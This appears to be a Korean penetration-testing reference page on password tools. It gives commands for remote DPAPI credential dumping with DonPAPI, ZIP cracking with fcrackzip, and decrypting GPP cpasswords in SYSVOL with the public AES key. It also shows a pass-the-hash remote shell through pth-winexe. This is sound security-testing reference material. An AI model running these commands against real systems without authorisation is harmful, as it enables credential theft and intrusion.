---
sidebar_position: 8
---

# 기타 Password Tools

기타 유용한 비밀번호 관련 도구들입니다.

## DonPAPI

> https://github.com/login-securite/DonPAPI

원격으로 DPAPI 자격증명을 덤프하는 도구입니다.

### 설치

```bash
git clone https://github.com/login-securite/DonPAPI.git
cd DonPAPI
pip install -r requirements.txt
```

### 사용법

```bash
# 기본 사용
DonPAPI <DOMAIN>/<USERNAME>:<PASSWORD>@<RHOST>

# 로컬 인증
DonPAPI -local_auth <USERNAME>@<RHOST>

# NTLM 해시 사용
DonPAPI --hashes <LM>:<NT> <DOMAIN>/<USERNAME>@<RHOST>

# LAPS 비밀번호 포함
DonPAPI -laps <DOMAIN>/<USERNAME>:<PASSWORD>@<RHOST>
```

### 예제

```bash
# 도메인 자격증명
DonPAPI corp.local/admin:Password123@10.10.10.100

# Pass-the-Hash
DonPAPI --hashes :aad3b435b51404eeaad3b435b51404ee corp.local/admin@10.10.10.100

# 로컬 계정
DonPAPI -local_auth administrator@192.168.1.10
```

---

## fcrackzip

ZIP 파일 비밀번호 크래커입니다.

### 설치

```bash
# Kali Linux
sudo apt install fcrackzip
```

### 사용법

```bash
# Dictionary attack
fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt file.zip

# Brute-force (숫자 4자리)
fcrackzip -u -b -c '1' -l 4-4 file.zip

# Brute-force (소문자 6자리)
fcrackzip -u -b -c 'a' -l 6-6 file.zip

# Brute-force (영문+숫자 8자리)
fcrackzip -u -b -c 'aA1' -l 8-8 file.zip
```

### 옵션

```bash
-u              # Unzip으로 검증 (필수)
-D              # Dictionary 모드
-b              # Brute-force 모드
-p <WORDLIST>   # 워드리스트 파일
-c <CHARSET>    # 문자셋 (a=소문자, A=대문자, 1=숫자, !=특수문자)
-l <LENGTH>     # 길이 범위 (예: 4-6)
-v              # Verbose
```

### 예제

```bash
# 일반적인 비밀번호
fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt secret.zip

# 숫자 4자리 PIN
fcrackzip -u -b -c '1' -l 4-4 protected.zip

# 복잡한 패턴 (대소문자+숫자 6-8자)
fcrackzip -u -b -c 'aA1' -l 6-8 file.zip
```

---

## Group Policy Preferences (GPP)

### gpp-decrypt

GPP 암호화된 비밀번호를 복호화합니다.

#### 설치

```bash
# Kali Linux (기본 포함)
# 또는
git clone https://github.com/t0thkr1s/gpp-decrypt.git
cd gpp-decrypt
```

#### 사용법

```bash
# Groups.xml 파일에서
python3 gpp-decrypt.py -f Groups.xml

# 암호화된 값 직접 입력
python3 gpp-decrypt.py -c edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
```

#### 수동 복호화

```bash
# AES 키 (공개됨)
# 4e 99 06 e8 fc b6 6c c9 fa f4 93 10 62 0f fe e8 f4 96 e8 06 cc 05 79 90 20 9b 09 a4 33 b6 6c 1b

# PowerShell
$encrypted = "edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"
$bytes = [Convert]::FromBase64String($encrypted)
$aes = [System.Security.Cryptography.Aes]::Create()
$aes.Key = [byte[]](0x4e,0x99,0x06,0xe8,0xfc,0xb6,0x6c,0xc9,0xfa,0xf4,0x93,0x10,0x62,0x0f,0xfe,0xe8,0xf4,0x96,0xe8,0x06,0xcc,0x05,0x79,0x90,0x20,0x9b,0x09,0xa4,0x33,0xb6,0x6c,0x1b)
$aes.IV = [byte[]](0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0)
$decryptor = $aes.CreateDecryptor()
$decrypted = $decryptor.TransformFinalBlock($bytes, 0, $bytes.Length)
[System.Text.Encoding]::Unicode.GetString($decrypted)
```

#### GPP 파일 위치

```
\\<DOMAIN>\SYSVOL\<DOMAIN>\Policies\
```

일반적인 파일:
- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

#### 검색

```bash
# SMB 공유에서 GPP 파일 찾기
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M gpp_password
netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M gpp_autologin

# 수동 검색
findstr /S /I cpassword \\<DOMAIN>\sysvol\<DOMAIN>\policies\*.xml
```

---

## 기타 유용한 도구

### pth-winexe

```bash
# Pass-the-Hash로 원격 실행
pth-winexe -U <DOMAIN>/<USERNAME>%<LM>:<NTLM> //<RHOST> cmd
```

### crackmapexec (Legacy)

```bash
# NetExec의 이전 버전
crackmapexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>'
```

### enum4linux-ng

```bash
# SMB 열거
enum4linux-ng <RHOST> -A
```

---

## 참고

**DonPAPI:**
- DPAPI 마스터키 및 자격증명 추출
- Chrome, Firefox 저장된 비밀번호
- RDP 자격증명
- Wi-Fi 비밀번호

**fcrackzip:**
- ZIP 파일 전용
- `-u` 옵션 필수 (unzip 검증)
- 작은 파일에 효과적
- 큰 워드리스트는 시간 오래 걸림

**GPP:**
- Windows 2008부터 패치됨 (MS14-025)
- 구형 시스템에서 여전히 발견됨
- AES 키가 공개되어 있어 복호화 가능
- SYSVOL 접근 권한만 있으면 가능
